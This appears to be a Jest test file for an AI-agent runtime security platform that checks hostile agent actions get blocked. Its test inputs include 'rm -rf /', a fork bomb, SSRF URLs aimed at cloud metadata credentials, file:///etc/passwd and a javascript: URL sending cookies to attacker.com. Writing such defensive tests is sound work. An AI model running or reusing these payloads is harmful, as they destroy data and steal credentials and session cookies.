import { AIRuntimeSecurityPlatform } from '../../src/core/ai-runtime-security';

describe('AIRuntimeSecurityPlatform Hardened Evaluation', () => {
  const sessionId = 'test-session-agent-01';

  beforeAll(() => {
    AIRuntimeSecurityPlatform.registerAgentSession({
      agentId: 'secure-coding-agent',
      agentType: 'coding_agent',
      sessionId,
      delegationDepth: 1,
      maxAllowedDepth: 5,
      principalUser: 'dev-user',
      organizationId: 'corp-engineering'
    });
  });

  describe('Session Authentication & Fail-Closed Boundaries', () => {
    test('strictly rejects unregistered or anonymous sessions fail-closed', () => {
      const decision = AIRuntimeSecurityPlatform.evaluateAgentAction({
        sessionId: 'unregistered-rogue-session',
        toolName: 'exec_cmd',
        intent: {
          actionCategory: 'EXECUTE',
          intentDescription: 'Run harmless command in unknown session',
          targetResource: 'terminal',
          payload: 'echo "hello world"'
        }
      });

      expect(decision.allowed).toBe(false);
      expect(decision.action).toBe('BLOCK');
      expect(decision.violatedPolicies).toContain('SESSION-001: Unknown or unauthenticated agent session');
      expect(decision.riskScore.classification).toBe('CRITICAL');
    });
  });

  describe('Coding Agent Unified Interpreter & AST Protection', () => {
    test('allows safe benign CLI commands', () => {
      const decision = AIRuntimeSecurityPlatform.evaluateAgentAction({
        sessionId,
        toolName: 'exec_cmd',
        intent: {
          actionCategory: 'EXECUTE',
          intentDescription: 'Run test suite',
          targetResource: 'terminal',
          payload: 'npm test --silent'
        }
      });

      expect(decision.allowed).toBe(true);
      expect(decision.action).toBe('ALLOW');
    });

    test('intercepts destructive host wipe command (rm -rf /)', () => {
      const decision = AIRuntimeSecurityPlatform.evaluateAgentAction({
        sessionId,
        toolName: 'exec_cmd',
        intent: {
          actionCategory: 'EXECUTE',
          intentDescription: 'Host wipe attempt',
          targetResource: 'bash',
          payload: 'rm -rf /'
        }
      });

      expect(decision.allowed).toBe(false);
      expect(decision.action).toBe('BLOCK');
      expect(decision.violatedPolicies[0]).toContain('CODE-002: Destructive Host Command Injection Detected');
    });

    test('intercepts classic bash fork bomb (:(){ :|:& };:)', () => {
      const decision = AIRuntimeSecurityPlatform.evaluateAgentAction({
        sessionId,
        toolName: 'exec_cmd',
        intent: {
          actionCategory: 'EXECUTE',
          intentDescription: 'Fork bomb DoS attempt',
          targetResource: 'bash',
          payload: ':(){ :|:& };:'
        }
      });

      expect(decision.allowed).toBe(false);
      expect(decision.action).toBe('BLOCK');
      expect(decision.violatedPolicies[0]).toContain('CODE-002: Destructive Host Command Injection Detected');
    });
  });

  describe('Browser Agent Authoritative Egress Protection', () => {
    const browserSessionId = 'browser-secure-session-02';

    beforeAll(() => {
      AIRuntimeSecurityPlatform.registerAgentSession({
        agentId: 'browser-agent-01',
        agentType: 'browser_agent',
        sessionId: browserSessionId,
        delegationDepth: 1,
        maxAllowedDepth: 5,
        principalUser: 'analyst-user',
        organizationId: 'corp-research'
      });
    });

    test('allows benign public URLs', () => {
      const decision = AIRuntimeSecurityPlatform.evaluateAgentAction({
        sessionId: browserSessionId,
        toolName: 'browser_navigate',
        intent: {
          actionCategory: 'NAVIGATE',
          intentDescription: 'Open documentation',
          targetResource: 'https://docs.github.com/en',
          payload: {}
        }
      });

      expect(decision.allowed).toBe(true);
      expect(decision.action).toBe('ALLOW');
    });

    test('blocks AWS cloud metadata (169.254.169.254)', () => {
      const decision = AIRuntimeSecurityPlatform.evaluateAgentAction({
        sessionId: browserSessionId,
        toolName: 'browser_navigate',
        intent: {
          actionCategory: 'NAVIGATE',
          intentDescription: 'Steal IMDS credentials',
          targetResource: 'http://169.254.169.254/latest/meta-data/',
          payload: {}
        }
      });

      expect(decision.allowed).toBe(false);
      expect(decision.action).toBe('BLOCK');
      expect(decision.violatedPolicies[0]).toContain('BROWSER-003: SSRF / Local Storage Navigation Hijack');
    });

    test('blocks hex-encoded IP SSRF (http://0xA9FEA9FE)', () => {
      const decision = AIRuntimeSecurityPlatform.evaluateAgentAction({
        sessionId: browserSessionId,
        toolName: 'browser_navigate',
        intent: {
          actionCategory: 'NAVIGATE',
          intentDescription: 'Steal credentials via hex IP encoding',
          targetResource: 'http://0xA9FEA9FE/meta-data',
          payload: {}
        }
      });

      expect(decision.allowed).toBe(false);
      expect(decision.action).toBe('BLOCK');
      expect(decision.violatedPolicies[0]).toContain('BROWSER-003: SSRF / Local Storage Navigation Hijack');
    });

    test('blocks loopback navigation (http://127.0.0.1:3000)', () => {
      const decision = AIRuntimeSecurityPlatform.evaluateAgentAction({
        sessionId: browserSessionId,
        toolName: 'browser_navigate',
        intent: {
          actionCategory: 'NAVIGATE',
          intentDescription: 'Probe local port',
          targetResource: 'http://127.0.0.1:3000/internal-admin',
          payload: {}
        }
      });

      expect(decision.allowed).toBe(false);
      expect(decision.action).toBe('BLOCK');
      expect(decision.violatedPolicies[0]).toContain('BROWSER-003: SSRF / Local Storage Navigation Hijack');
    });

    test('blocks dangerous URL schemes (file:///etc/passwd, javascript:)', () => {
      const fileDecision = AIRuntimeSecurityPlatform.evaluateAgentAction({
        sessionId: browserSessionId,
        toolName: 'browser_navigate',
        intent: {
          actionCategory: 'NAVIGATE',
          intentDescription: 'Local file exfiltration',
          targetResource: 'file:///etc/passwd',
          payload: {}
        }
      });
      expect(fileDecision.allowed).toBe(false);
      expect(fileDecision.action).toBe('BLOCK');

      const jsDecision = AIRuntimeSecurityPlatform.evaluateAgentAction({
        sessionId: browserSessionId,
        toolName: 'browser_navigate',
        intent: {
          actionCategory: 'NAVIGATE',
          intentDescription: 'XSS script injection',
          targetResource: 'javascript:document.location="http://attacker.com/steal?"+document.cookie',
          payload: {}
        }
      });
      expect(jsDecision.allowed).toBe(false);
      expect(jsDecision.action).toBe('BLOCK');
    });
  });

  describe('Multi-Agent Delegation Depth Guardrails', () => {
    test('terminates runaway recursive multi-agent calls exceeding maxAllowedDepth', () => {
      const multiSessionId = 'multi-agent-loop-session';
      AIRuntimeSecurityPlatform.registerAgentSession({
        agentId: 'recursive-swarm',
        agentType: 'multi_agent',
        sessionId: multiSessionId,
        delegationDepth: 6,
        maxAllowedDepth: 5,
        principalUser: 'lead-agent',
        organizationId: 'swarm-dept'
      });

      const decision = AIRuntimeSecurityPlatform.evaluateAgentAction({
        sessionId: multiSessionId,
        toolName: 'delegate_task',
        intent: {
          actionCategory: 'DELEGATE',
          intentDescription: 'Sub-agent spawn',
          targetResource: 'subagent-6',
          payload: {}
        }
      });

      expect(decision.allowed).toBe(false);
      expect(decision.action).toBe('BLOCK');
      expect(decision.violatedPolicies[0]).toContain('AGENT-001: Multi-Agent Runaway Delegation Loop');
    });
  });
});
